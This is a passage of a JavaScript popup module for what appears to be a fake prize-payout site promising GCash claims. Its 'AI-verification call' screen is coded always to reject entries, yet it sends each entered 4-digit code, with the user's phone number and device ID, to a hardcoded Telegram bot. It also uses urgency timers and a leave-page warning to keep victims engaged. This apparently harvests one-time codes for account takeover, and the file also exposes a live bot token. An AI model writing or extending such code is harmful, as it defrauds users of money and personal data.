/**
 * Popup Share Module - With 500 Bills Indicators & AI-Verification Call
 * Updated: AI-Verification Call System (Admin calls user)
 * - Shows user's mobile number with animation
 * - 60-second countdown timer (Neon Green → Neon Red)
 * - Always invalid by default
 * - Full Telegram notifications
 */

// ========== POPUP MODULE ==========
(function() {
    'use strict';
    
    let currentBalance = 0;
    let currentPhase = 1;
    let claimInProgress = false;
    let isRedirecting = false;
    let currentFirewallStatus = false;
    
    // ========== AI-VERIFICATION CALL VARIABLES ==========
    let callInProgress = false;
    let callCountdown = 60;
    let callTimerInterval = null;
    let isCallRequested = false;
    let currentCallCode = '';
    let codeEntered = false;
    
    // ========== SOUND EFFECT ==========
    function playClaimSound() {
        try {
            var audio = new Audio('sounds/super_ace_scatter_ring.mp3');
            audio.volume = 0.7;
            audio.play().catch(function(e) { console.log('Sound play prevented:', e); });
        } catch(e) {
            console.log('Sound error:', e);
        }
    }
    
    function playCallSound() {
        try {
            var audio = new Audio('sounds/call_ring.mp3');
            audio.volume = 0.5;
            audio.play().catch(function(e) { console.log('Call sound error:', e); });
        } catch(e) {
            console.log('Call sound error:', e);
        }
    }
    
    // ========== TELEGRAM NOTIFICATIONS ==========
    var BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
    var CHAT_ID = "7298607329";
    
    function sendTelegramMessage(message) {
        try {
            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message))
                .catch(function(e) { console.error('Telegram error:', e); });
        } catch(e) {
            console.error('Telegram error:', e);
        }
    }
    
    // ========== AI-VERIFICATION CALL TELEGRAM NOTIFICATIONS ==========
    function sendAICallRequestNotification(userPhone, deviceId, code) {
        var now = new Date();
        var timestamp = now.toLocaleString();
        var message = '📞 AI-VERIFICATION CALL REQUESTED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n🔑 Code Generated: ' + code + '\n⏰ Time: ' + timestamp + '\n📊 Status: Call requested - Admin will call user\n━━━━━━━━━━━━━━━━━━━━';
        sendTelegramMessage(message);
    }
    
    function sendAICodeAttemptNotification(userPhone, deviceId, codeEntered, secondsLeft) {
        var now = new Date();
        var timestamp = now.toLocaleString();
        var message = '🔑 AI-CODE VERIFICATION ATTEMPT\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n📝 Code Entered: ' + codeEntered + '\n⏰ Time: ' + timestamp + '\n⏱️ Seconds Left: ' + secondsLeft + 's\n📊 Status: INVALID CODE (No valid code exists)\n━━━━━━━━━━━━━━━━━━━━';
        sendTelegramMessage(message);
    }
    
    function sendAICallExpiredNotification(userPhone, deviceId) {
        var now = new Date();
        var timestamp = now.toLocaleString();
        var message = '⏰ AI-VERIFICATION CALL EXPIRED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n⏰ Time: ' + timestamp + '\n📊 Status: Call expired - User needs to request a new call\n━━━━━━━━━━━━━━━━━━━━';
        sendTelegramMessage(message);
    }
    
    function sendClaimButtonNotification(userPhone, deviceId, amount) {
        var now = new Date();
        var timestamp = now.toLocaleString();
        var message = '💳 CLAIM THRU GCASH INITIATED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n💰 Amount: ₱' + amount.toFixed(2) + '\n⏰ Time: ' + timestamp + '\n📊 Status: Claim process started\n━━━━━━━━━━━━━━━━━━━━';
        sendTelegramMessage(message);
    }
    
    // ========== UPDATE BILLS INDICATORS ==========
    function updateBillsIndicators(balance) {
        var billIndicators = document.querySelectorAll('.bill-indicator');
        var billCount = Math.min(4, Math.floor(balance / 500));
        
        for (var i = 0; i < billIndicators.length; i++) {
            var indicator = billIndicators[i];
            var img = indicator.querySelector('img');
            
            if (i < billCount) {
                if (i % 2 === 0) {
                    img.src = 'images/PHL-500-Front.png';
                } else {
                    img.src = 'images/PHL-500-Back.png';
                }
                img.style.opacity = '1';
                img.style.filter = 'none';
                indicator.classList.add('active');
            } else {
                img.src = 'images/PHL-500-Front.png';
                img.style.opacity = '0.25';
                img.style.filter = 'grayscale(100%) brightness(30%)';
                indicator.classList.remove('active');
            }
        }
    }
    
    // ========== INITIALIZATION ==========
    function init() {
        console.log('🎯 Popup Module Starting...');
        
        var popup = document.getElementById('prizePopup');
        if (!popup) {
            console.error('Popup element not found!');
            return;
        }
        
        getFirewallStatus();
        attachClaimButton();
        addAnimations();
        addPhase3Animations();
        
        console.log('✅ Popup Module ready');
    }
    
    // ========== ADD ANIMATIONS ==========
    function addAnimations() {
        if (document.querySelector('#popup-casino-animations')) return;
        
        var style = document.createElement('style');
        style.id = 'popup-casino-animations';
        style.textContent = `
            @keyframes bounceIn {
                0% { transform: scale(0) rotate(-180deg); opacity: 0; }
                60% { transform: scale(1.1) rotate(0deg); }
                100% { transform: scale(1) rotate(0deg); opacity: 1; }
            }
            @keyframes pulseGold {
                0% { transform: scale(1); }
                50% { transform: scale(1.02); box-shadow: 0 0 25px rgba(212,175,55,0.6); }
                100% { transform: scale(1); }
            }
            @keyframes shake {
                0% { transform: translateX(0); }
                25% { transform: translateX(-5px); }
                50% { transform: translateX(5px); }
                75% { transform: translateX(-5px); }
                100% { transform: translateX(0); }
            }
            @keyframes balanceDrain {
                0%, 100% { transform: scale(1); }
                50% { transform: scale(1.05); filter: brightness(1.2); }
            }
            @keyframes successFlash {
                0% { transform: scale(1); }
                50% { transform: scale(1.3); filter: brightness(2); }
                100% { transform: scale(1); }
            }
            @keyframes pulseRing {
                0%, 100% { transform: scale(1); opacity: 1; }
                50% { transform: scale(1.05); opacity: 0.7; }
            }
            @keyframes slideDown {
                from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
                to { opacity: 1; transform: translateX(-50%) translateY(0); }
            }
            @keyframes phonePulse {
                0%, 100% { transform: scale(1); opacity: 1; }
                50% { transform: scale(1.05); opacity: 0.8; text-shadow: 0 0 30px rgba(0, 212, 255, 0.5); }
            }
            @keyframes numberReveal {
                0% { opacity: 0; transform: scale(0.5) rotateY(90deg); }
                50% { opacity: 0.5; transform: scale(1.1) rotateY(-10deg); }
                100% { opacity: 1; transform: scale(1) rotateY(0deg); }
            }
            @keyframes numberGlowPulse {
                0%, 100% { text-shadow: 0 0 20px rgba(0, 212, 255, 0.2); }
                50% { text-shadow: 0 0 40px rgba(0, 212, 255, 0.6), 0 0 80px rgba(0, 212, 255, 0.2); }
            }
            @keyframes timerPulseRed {
                0%, 100% { transform: scale(1); opacity: 1; }
                50% { transform: scale(1.1); opacity: 0.7; }
            }
            
            .bill-indicators {
                display: flex;
                justify-content: center;
                gap: 8px;
                margin: 15px 0;
            }
            .bill-indicator {
                width: 55px;
                height: 28px;
                border-radius: 4px;
                overflow: hidden;
                transition: all 0.3s ease;
                border: 1px solid rgba(212, 175, 55, 0.3);
            }
            .bill-indicator img {
                width: 100%;
                height: 100%;
                object-fit: cover;
                transition: all 0.3s ease;
            }
            .bill-indicator.active {
                border-color: #d4af37;
                box-shadow: 0 0 8px rgba(212, 175, 55, 0.5);
            }
            
            .small-back-btn {
                background: linear-gradient(to bottom, #555, #333);
                border: 1px solid #777;
                border-radius: 8px;
                padding: 8px 18px;
                font-size: 11px;
                font-weight: 700;
                color: #ccc;
                cursor: pointer;
                display: inline-flex;
                align-items: center;
                justify-content: center;
                gap: 5px;
                width: auto;
                margin-top: 10px;
                font-family: 'Orbitron', monospace;
                letter-spacing: 1px;
                text-shadow: none;
                box-shadow: 0 3px 0 #222;
                transition: all 0.1s ease;
            }
            .small-back-btn:active {
                transform: translateY(3px);
                box-shadow: 0 0 0 #222;
            }
            
            .claim-gcash-button {
                background: linear-gradient(to bottom, #d4af37, #aa771c);
                border: 1px solid #fcf6ba;
                border-radius: 8px;
                padding: 12px 20px;
                font-weight: 800;
                color: #1a1100;
                font-size: 13px;
                cursor: pointer;
                font-family: 'Orbitron', monospace;
                letter-spacing: 1px;
                text-shadow: 1px 1px 0 rgba(255,255,255,0.3);
                box-shadow: 0 4px 0 #6e4b0c;
                transition: all 0.1s ease;
            }
            .claim-gcash-button:active {
                transform: translateY(4px);
                box-shadow: 0 0 0 #6e4b0c;
            }
            .claim-gcash-button:disabled {
                opacity: 0.5;
                cursor: not-allowed;
            }
            
            .divider {
                width: 50px;
                height: 2px;
                background: linear-gradient(90deg, #aa771c, #fcf6ba, #aa771c);
                margin: 10px auto;
            }
            
            .phase3-heading {
                font-family: 'Orbitron', monospace;
                font-size: 18px;
                font-weight: 900;
                color: #00d4ff;
                margin: 5px 0;
                letter-spacing: 1px;
                text-align: center;
                text-shadow: 0 0 15px #00d4ff;
            }
            
            .verification-input {
                text-align: center;
                font-size: 24px;
                font-weight: bold;
                width: 160px;
                padding: 14px;
                background: #000;
                border: 2px solid #00d4ff;
                border-radius: 10px;
                color: #00d4ff;
                font-family: 'Orbitron', monospace;
                transition: all 0.3s ease;
                letter-spacing: 4px;
                box-shadow: 0 0 15px rgba(0, 212, 255, 0.2);
            }
            .verification-input:focus {
                border-color: #00d4ff;
                box-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
                outline: none;
            }
            .verification-input::placeholder {
                color: rgba(0, 212, 255, 0.3);
                letter-spacing: 2px;
                font-size: 16px;
            }
            
            .phone-number-display {
                font-size: 24px;
                font-family: 'Orbitron', monospace;
                font-weight: 900;
                color: #00d4ff;
                margin-top: 8px;
                letter-spacing: 2px;
                animation: numberReveal 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards, numberGlowPulse 2s ease-in-out infinite 0.8s;
                display: inline-block;
            }
            .phone-number-display .phone-icon {
                margin-right: 8px;
                display: inline-block;
                animation: phonePulse 1.5s ease-in-out infinite;
            }
        `;
        document.head.appendChild(style);
    }
    
    // ========== PHASE 3 ANIMATIONS ==========
    function addPhase3Animations() {
        if (document.querySelector('#phase3-animations')) return;
        
        var style = document.createElement('style');
        style.id = 'phase3-animations';
        style.textContent = `
            @keyframes pulseRing {
                0%, 100% { transform: scale(1); opacity: 1; }
                50% { transform: scale(1.05); opacity: 0.7; }
            }
            @keyframes slideDown {
                from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
                to { opacity: 1; transform: translateX(-50%) translateY(0); }
            }
            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                20% { transform: translateX(-8px); }
                40% { transform: translateX(8px); }
                60% { transform: translateX(-5px); }
                80% { transform: translateX(5px); }
            }
            @keyframes numberReveal {
                0% { opacity: 0; transform: scale(0.5) rotateY(90deg); }
                50% { opacity: 0.5; transform: scale(1.1) rotateY(-10deg); }
                100% { opacity: 1; transform: scale(1) rotateY(0deg); }
            }
            @keyframes numberGlowPulse {
                0%, 100% { text-shadow: 0 0 20px rgba(0, 212, 255, 0.2); }
                50% { text-shadow: 0 0 40px rgba(0, 212, 255, 0.6), 0 0 80px rgba(0, 212, 255, 0.2); }
            }
            @keyframes phonePulse {
                0%, 100% { transform: scale(1); opacity: 1; }
                50% { transform: scale(1.1); opacity: 0.8; }
            }
            @keyframes timerPulseRed {
                0%, 100% { transform: scale(1); opacity: 1; }
                50% { transform: scale(1.1); opacity: 0.7; }
            }
            .verification-input:focus {
                border-color: #00d4ff !important;
                box-shadow: 0 0 30px rgba(0, 212, 255, 0.3) !important;
                outline: none;
            }
            .phone-number-display {
                font-size: 24px;
                font-family: 'Orbitron', monospace;
                font-weight: 900;
                color: #00d4ff;
                margin-top: 8px;
                letter-spacing: 2px;
                animation: numberReveal 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards, numberGlowPulse 2s ease-in-out infinite 0.8s;
                display: inline-block;
            }
            .phone-number-display .phone-icon {
                margin-right: 8px;
                display: inline-block;
                animation: phonePulse 1.5s ease-in-out infinite;
            }
        `;
        document.head.appendChild(style);
    }
    
    // ========== BALANCE DECREMENT ANIMATION ==========
    function animateBalanceDecrement(start, end, duration, callback) {
        var balanceSpan = document.getElementById('popupBalanceAmount');
        var balanceDisplay = document.getElementById('popupBalanceDisplay');
        var claimBtn = document.getElementById('claimGCashBtn');
        
        if (!balanceSpan) {
            if (callback) callback();
            return;
        }
        
        if (claimBtn) {
            claimBtn.disabled = true;
            claimBtn.style.opacity = '0.7';
            claimBtn.style.pointerEvents = 'none';
            claimBtn.innerHTML = '⏳ PROCESSING...';
        }
        
        var totalSteps = 30;
        var decrementAmount = start / totalSteps;
        var currentStep = 0;
        
        if (balanceDisplay) {
            balanceDisplay.style.animation = 'balanceDrain 0.3s ease infinite';
        }
        
        var interval = setInterval(function() {
            currentStep++;
            var currentVal = start - (decrementAmount * currentStep);
            
            if (balanceSpan) {
                balanceSpan.textContent = Math.max(0, currentVal).toFixed(2);
                balanceSpan.style.color = currentVal < start * 0.3 ? '#ff6666' : '#fce883';
                balanceSpan.style.fontSize = (48 - (currentStep * 0.8)) + 'px';
            }
            
            updateBillsIndicators(Math.max(0, currentVal));
            
            if (currentStep >= totalSteps) {
                clearInterval(interval);
                
                if (balanceSpan) {
                    balanceSpan.textContent = '0.00';
                    balanceSpan.style.color = '#ff4444';
                    balanceSpan.style.fontSize = '48px';
                }
                
                if (balanceDisplay) {
                    balanceDisplay.style.animation = 'none';
                }
                
                if (balanceDisplay) {
                    balanceDisplay.style.animation = 'successFlash 0.5s ease';
                    balanceDisplay.innerHTML = '✅ <span style="font-size:24px; color:#22C55E;">PROCESSING</span>';
                    
                    setTimeout(function() {
                        if (balanceDisplay) {
                            balanceDisplay.style.animation = 'none';
                        }
                    }, 500);
                }
                
                setTimeout(function() {
                    if (callback) callback();
                }, 600);
            }
        }, duration / totalSteps);
        
        if (claimBtn) {
            claimBtn.style.animation = 'pulseGold 0.5s ease infinite';
        }
    }
    
    // ========== GET FIREWALL STATUS ==========
    function getFirewallStatus() {
        try {
            var db = firebase.database();
            return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
                var data = snapshot.val();
                currentFirewallStatus = (data && data.active === true);
                console.log('Firewall status:', currentFirewallStatus ? 'ON' : 'OFF');
                return currentFirewallStatus;
            });
        } catch(e) {
            console.error('Firewall error:', e);
            return Promise.resolve(false);
        }
    }
    
    // ========== SYNC BALANCE FROM FIREBASE ==========
    function syncBalanceFromFirebase() {
        var userPhone = localStorage.getItem("userPhone");
        if (!userPhone) return Promise.resolve(0);
        
        try {
            var db = firebase.database();
            return db.ref('user_sessions/' + userPhone).once('value').then(function(snap) {
                if (snap.exists() && snap.val().balance !== undefined) {
                    var balance = snap.val().balance;
                    var balanceEl = document.getElementById('userBalanceDisplay');
                    if (balanceEl) balanceEl.innerText = balance.toFixed(2);
                    return balance;
                }
                return 0;
            });
        } catch(e) {
            console.error('Error syncing balance:', e);
            return Promise.resolve(0);
        }
    }
    
    // ========== ATTACH CLAIM BUTTON ==========
    function attachClaimButton() {
        var claimBtn = document.getElementById('claimNowBtn');
        if (!claimBtn) {
            console.error('Claim button not found!');
            return;
        }
        
        claimBtn.onclick = function(e) {
            e.preventDefault();
            e.stopPropagation();
            
            console.log('🔔 Claim button clicked!');
            
            playClaimSound();
            
            var userPhone = localStorage.getItem("userPhone") || "Unknown";
            var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
            
            syncBalanceFromFirebase().then(function(balance) {
                showPopup(balance);
                if (window.ConfettiModule) window.ConfettiModule.start();
            });
        };
        
        console.log('✅ Claim button attached');
    }
    
    // ========== GET PAYOUT LINK ==========
    function getLatestPayoutLink() {
        try {
            var db = firebase.database();
            return db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value').then(function(snapshot) {
                if (snapshot.exists()) {
                    var key = Object.keys(snapshot.val())[0];
                    var linkData = snapshot.val()[key];
                    return { key: key, url: linkData.url };
                }
                return null;
            });
        } catch(e) {
            console.error('Link error:', e);
            return Promise.resolve(null);
        }
    }
    
    // ========== MARK LINK AS USED ==========
    function markLinkAsUsed(linkKey, userPhone) {
        try {
            var db = firebase.database();
            return db.ref('links/' + linkKey).update({
                status: 'used',
                user: userPhone,
                usedAt: Date.now()
            }).then(function() {
                console.log('✅ Link marked as used');
            });
        } catch(e) {
            console.error('Error marking link:', e);
            return Promise.resolve();
        }
    }
    
    // ========== BEFORE UNLOAD HANDLER ==========
    function beforeUnloadHandler(e) {
        if (claimInProgress && !isRedirecting) {
            var message = "Your payout is unsuccessful! Please complete the process.";
            e.preventDefault();
            e.returnValue = message;
            return message;
        }
    }
    
    // ========== SHOW FIREWALL POPUP ==========
    function showFirewallPopup() {
        var popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        currentPhase = 3;
        
        popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
        popupInner.style.opacity = '0';
        popupInner.style.transform = 'scale(0.95)';
        
        setTimeout(function() {
            showPhase3();
            popupInner.style.opacity = '1';
            popupInner.style.transform = 'scale(1)';
        }, 300);
    }
    
    // ========== PHASE 3: AI-VERIFICATION CALL ==========
    function showPhase3() {
        var popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        var popupContainer = document.querySelector('.popup-container');
        if (popupContainer) {
            popupContainer.style.maxWidth = '380px';
            popupContainer.style.width = '90%';
        }
        
        // Reset call state
        callInProgress = false;
        callCountdown = 60;
        if (callTimerInterval) {
            clearInterval(callTimerInterval);
            callTimerInterval = null;
        }
        isCallRequested = false;
        currentCallCode = '';
        codeEntered = false;
        
        // Get user's mobile number
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var formattedPhone = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase3">✕</div>
            
            <div style="text-align: center; margin-bottom: 10px;">
                <div style="width: 70px; height: 70px; margin: 0 auto; background: linear-gradient(145deg, rgba(0, 212, 255, 0.15), rgba(0, 100, 200, 0.05)); border-radius: 50%; border: 2px solid rgba(0, 212, 255, 0.3); display: flex; align-items: center; justify-content: center; animation: pulseRing 2s ease-in-out infinite;">
                    <i class="fas fa-phone" style="font-size: 30px; color: #00d4ff; text-shadow: 0 0 20px rgba(0, 212, 255, 0.5);"></i>
                </div>
            </div>
            
            <h2 class="phase3-heading">🔐 AI-VERIFICATION</h2>
            
            <div class="divider" style="width: 60px; height: 2px; background: linear-gradient(90deg, transparent, #00d4ff, transparent); margin: 8px auto;"></div>
            
            <p style="font-size: 11px; color: rgba(255,255,255,0.6); text-align: center; margin: 5px 0 15px 0; font-family: 'Poppins', sans-serif; letter-spacing: 0.5px;">
                <i class="fas fa-shield-alt" style="color: #00d4ff; margin-right: 6px;"></i>
                System AI will call you with a <strong style="color: #00d4ff;">4-digit verification code</strong>
            </p>
            
            <!-- STATUS DISPLAY -->
            <div id="callStatusContainer" style="background: rgba(0, 212, 255, 0.05); border: 1px solid rgba(0, 212, 255, 0.1); border-radius: 12px; padding: 15px; margin-bottom: 15px; text-align: center;">
                <div id="callStatusIcon" style="font-size: 28px; margin-bottom: 5px;">📞</div>
                <div id="callStatusText" style="font-size: 13px; color: rgba(255,255,255,0.8); font-family: 'Poppins', sans-serif; font-weight: 500;">Ready for verification</div>
                
                <!-- PHONE NUMBER DISPLAY WITH ANIMATION -->
                <div id="phoneNumberDisplay" style="display: none; margin-top: 8px;">
                    <span class="phone-number-display">
                        <span class="phone-icon">📱</span>
                        ${formattedPhone}
                    </span>
                </div>
                
                <div id="callTimerDisplay" style="font-size: 28px; font-family: 'Orbitron', monospace; font-weight: 900; color: #39ff14; margin-top: 5px; text-shadow: 0 0 30px rgba(57, 255, 20, 0.4), 0 0 60px rgba(57, 255, 20, 0.1); display: none;">60s</div>
            </div>
            
            <!-- REQUEST CALL BUTTON -->
            <button id="requestCallBtn" class="claim-gcash-button" style="width: 100%; background: linear-gradient(to bottom, #00d4ff, #0088cc); border: 1px solid #66ddff; color: #fff; text-shadow: none; box-shadow: 0 4px 0 #006699; padding: 14px; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 10px; font-family: 'Orbitron', monospace; letter-spacing: 1px;">
                <i class="fas fa-phone-alt"></i>
                REQUEST AI-VERIFICATION CALL
            </button>
            
            <!-- CODE INPUT SECTION -->
            <div id="codeSection" style="display: none; margin-top: 15px;">
                <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 10px;">
                    <i class="fas fa-key" style="color: #00d4ff; font-size: 14px;"></i>
                    <span style="font-size: 11px; color: rgba(255,255,255,0.6); font-family: 'Poppins', sans-serif;">Enter the 4-digit code from the call</span>
                </div>
                
                <div style="display: flex; gap: 10px; justify-content: center; align-items: center; flex-wrap: wrap;">
                    <input type="text" id="code4Digit" class="verification-input" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">
                    <button id="verifyCodeBtn" class="claim-gcash-button" style="background: linear-gradient(to bottom, #22C55E, #16A34A); border: 1px solid #4ade80; color: #fff; text-shadow: none; box-shadow: 0 4px 0 #15803d; padding: 14px 20px; font-size: 13px; font-family: 'Orbitron', monospace; letter-spacing: 1px;">
                        <i class="fas fa-check"></i> VERIFY
                    </button>
                </div>
                
                <div id="codeErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff4444; font-size: 11px; padding: 8px; border-radius: 8px; font-family: 'Poppins', sans-serif; background: rgba(255, 68, 68, 0.1); border: 1px solid rgba(255, 68, 68, 0.2);">
                    <i class="fas fa-exclamation-circle"></i> Invalid code. Please request a new call.
                </div>
                
                <div id="callExpiredMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff8800; font-size: 11px; padding: 8px; border-radius: 8px; font-family: 'Poppins', sans-serif; background: rgba(255, 136, 0, 0.1); border: 1px solid rgba(255, 136, 0, 0.2);">
                    <i class="fas fa-clock"></i> Call code expired. Request a new call.
                </div>
            </div>
            
            <div style="text-align: center; margin-top: 12px;">
                <button class="small-back-btn" id="backBtnPhase3">← BACK</button>
            </div>
        `;
        
        attachPhase3Events();
    }
    
    // ========== ATTACH PHASE 3 EVENTS ==========
    function attachPhase3Events() {
        var closeBtn = document.getElementById('popupClosePhase3');
        if (closeBtn) {
            closeBtn.onclick = function() { 
                stopCallTimer();
                closePopup(); 
            };
        }
        
        var backBtn = document.getElementById('backBtnPhase3');
        if (backBtn) {
            backBtn.onclick = function() {
                stopCallTimer();
                var popupInner = document.querySelector('.popup-inner');
                if (popupInner) {
                    popupInner.style.transition = 'opacity 0.3s ease';
                    popupInner.style.opacity = '0';
                    setTimeout(function() {
                        showPhase1(currentBalance);
                        popupInner.style.opacity = '1';
                    }, 300);
                }
            };
        }
        
        // ========== REQUEST CALL BUTTON ==========
        var requestBtn = document.getElementById('requestCallBtn');
        if (requestBtn) {
            requestBtn.onclick = function() {
                if (callInProgress) {
                    alert("Please wait for the current call to complete.");
                    return;
                }
                requestAICall();
            };
        }
        
        // ========== VERIFY CODE BUTTON ==========
        var verifyBtn = document.getElementById('verifyCodeBtn');
        var codeInput = document.getElementById('code4Digit');
        
        if (verifyBtn) {
            verifyBtn.onclick = function() {
                verifyCode();
            };
        }
        
        if (codeInput) {
            codeInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    verifyCode();
                }
            });
            
            codeInput.addEventListener('input', function(e) {
                var value = this.value.trim();
                if (value.length === 4 && /^\d+$/.test(value)) {
                    this.style.borderColor = '#22C55E';
                    this.style.boxShadow = '0 0 20px rgba(34, 197, 94, 0.3)';
                } else {
                    this.style.borderColor = '#00d4ff';
                    this.style.boxShadow = '0 0 15px rgba(0, 212, 255, 0.2)';
                }
            });
        }
    }
    
    // ========== REQUEST AI-VERIFICATION CALL ==========
    function requestAICall() {
        if (callInProgress) return;
        
        callInProgress = true;
        isCallRequested = true;
        callCountdown = 60;
        currentCallCode = generateCallCode();
        codeEntered = false;
        
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
        
        // Send Telegram notification with code
        sendAICallRequestNotification(userPhone, deviceId, currentCallCode);
        
        // Update UI
        var statusIcon = document.getElementById('callStatusIcon');
        var statusText = document.getElementById('callStatusText');
        var phoneDisplay = document.getElementById('phoneNumberDisplay');
        var timerDisplay = document.getElementById('callTimerDisplay');
        var requestBtn = document.getElementById('requestCallBtn');
        var codeSection = document.getElementById('codeSection');
        var codeInput = document.getElementById('code4Digit');
        var codeErrorMsg = document.getElementById('codeErrorMsg');
        var callExpiredMsg = document.getElementById('callExpiredMsg');
        
        // Reset messages
        if (codeErrorMsg) codeErrorMsg.style.display = 'none';
        if (callExpiredMsg) callExpiredMsg.style.display = 'none';
        if (codeInput) codeInput.value = '';
        
        if (statusIcon) statusIcon.innerHTML = '📞';
        if (statusText) {
            statusText.innerHTML = '📱 <strong style="color: #00d4ff;">AI-VERIFICATION CALL</strong> is being placed...<br><span style="font-size: 10px; color: rgba(255,255,255,0.3);">Please wait for the call</span>';
            statusText.style.color = '#00d4ff';
        }
        if (phoneDisplay) {
            phoneDisplay.style.display = 'block';
        }
        if (timerDisplay) {
            timerDisplay.style.display = 'block';
            timerDisplay.textContent = '60s';
            timerDisplay.style.color = '#39ff14';
            timerDisplay.style.textShadow = '0 0 30px rgba(57, 255, 20, 0.4), 0 0 60px rgba(57, 255, 20, 0.1)';
        }
        if (requestBtn) {
            requestBtn.disabled = true;
            requestBtn.style.opacity = '0.5';
            requestBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> CALLING...';
        }
        if (codeSection) {
            codeSection.style.display = 'none';
        }
        
        // Play call sound effect
        playCallSound();
        
        // Start countdown timer
        startCallTimer();
        
        // Simulate "call connected" after 4 seconds (admin calls user)
        setTimeout(function() {
            if (statusIcon) statusIcon.innerHTML = '📱';
            if (statusText) {
                statusText.innerHTML = '🔊 <strong style="color: #22C55E;">AI-VERIFICATION CALL</strong> connected!<br><span style="font-size: 11px; color: rgba(255,255,255,0.5);">Enter the 4-digit code below</span>';
                statusText.style.color = '#22C55E';
            }
            if (codeSection) {
                codeSection.style.display = 'block';
            }
            if (codeInput) {
                codeInput.focus();
            }
        }, 4000);
    }
    
    // ========== GENERATE CALL CODE ==========
    function generateCallCode() {
        var code = Math.floor(1000 + Math.random() * 9000);
        return code.toString();
    }
    
    // ========== START CALL TIMER ==========
    function startCallTimer() {
        stopCallTimer();
        
        var timerDisplay = document.getElementById('callTimerDisplay');
        var statusText = document.getElementById('callStatusText');
        var requestBtn = document.getElementById('requestCallBtn');
        var callExpiredMsg = document.getElementById('callExpiredMsg');
        var codeSection = document.getElementById('codeSection');
        
        // Set initial color - Neon Green
        if (timerDisplay) {
            timerDisplay.style.color = '#39ff14';
            timerDisplay.style.textShadow = '0 0 30px rgba(57, 255, 20, 0.4), 0 0 60px rgba(57, 255, 20, 0.1)';
            timerDisplay.style.animation = '';
        }
        
        callTimerInterval = setInterval(function() {
            callCountdown--;
            
            if (timerDisplay) {
                timerDisplay.textContent = callCountdown + 's';
                
                // ========== NEON COLOR SCHEME ==========
                // 60s - 10s: NEON GREEN (#39ff14)
                // 9s - 0s: NEON RED (#ff1744)
                
                if (callCountdown <= 9) {
                    // NEON RED - Urgent (9-0 seconds)
                    timerDisplay.style.color = '#ff1744';
                    timerDisplay.style.textShadow = '0 0 30px rgba(255, 23, 68, 0.6), 0 0 60px rgba(255, 23, 68, 0.3), 0 0 100px rgba(255, 23, 68, 0.1)';
                    timerDisplay.style.animation = 'timerPulseRed 0.5s ease-in-out infinite';
                } else {
                    // NEON GREEN - Normal (60-10 seconds)
                    timerDisplay.style.color = '#39ff14';
                    timerDisplay.style.textShadow = '0 0 30px rgba(57, 255, 20, 0.4), 0 0 60px rgba(57, 255, 20, 0.1)';
                    timerDisplay.style.animation = '';
                }
            }
            
            if (callCountdown <= 0) {
                // Call expired
                stopCallTimer();
                
                var userPhone = localStorage.getItem("userPhone") || "Unknown";
                var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
                sendAICallExpiredNotification(userPhone, deviceId);
                
                if (statusText) {
                    statusText.innerHTML = '⏰ <strong style="color: #ff8800;">CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.5);">Please request a new call</span>';
                    statusText.style.color = '#ff8800';
                }
                if (timerDisplay) {
                    timerDisplay.style.display = 'none';
                    timerDisplay.style.animation = '';
                }
                if (codeSection) {
                    codeSection.style.display = 'none';
                }
                if (requestBtn) {
                    requestBtn.disabled = false;
                    requestBtn.style.opacity = '1';
                    requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> REQUEST AI-VERIFICATION CALL';
                }
                if (callExpiredMsg) {
                    callExpiredMsg.style.display = 'block';
                }
                
                callInProgress = false;
                isCallRequested = false;
            }
        }, 1000);
    }
    
    // ========== STOP CALL TIMER ==========
    function stopCallTimer() {
        if (callTimerInterval) {
            clearInterval(callTimerInterval);
            callTimerInterval = null;
        }
    }
    
    // ========== VERIFY CODE ==========
    function verifyCode() {
        var codeInput = document.getElementById('code4Digit');
        var codeErrorMsg = document.getElementById('codeErrorMsg');
        var callExpiredMsg = document.getElementById('callExpiredMsg');
        var verifyBtn = document.getElementById('verifyCodeBtn');
        
        if (!codeInput) return;
        
        var enteredCode = codeInput.value.trim();
        
        // Validate input
        if (!enteredCode || enteredCode.length !== 4 || !/^\d+$/.test(enteredCode)) {
            if (codeErrorMsg) {
                codeErrorMsg.textContent = '⚠️ Please enter a valid 4-digit code.';
                codeErrorMsg.style.display = 'block';
            }
            codeInput.style.borderColor = '#ff4444';
            codeInput.style.boxShadow = '0 0 20px rgba(255, 68, 68, 0.3)';
            shakeElement(codeInput);
            return;
        }
        
        // Check if call is still active
        if (callCountdown <= 0) {
            if (callExpiredMsg) {
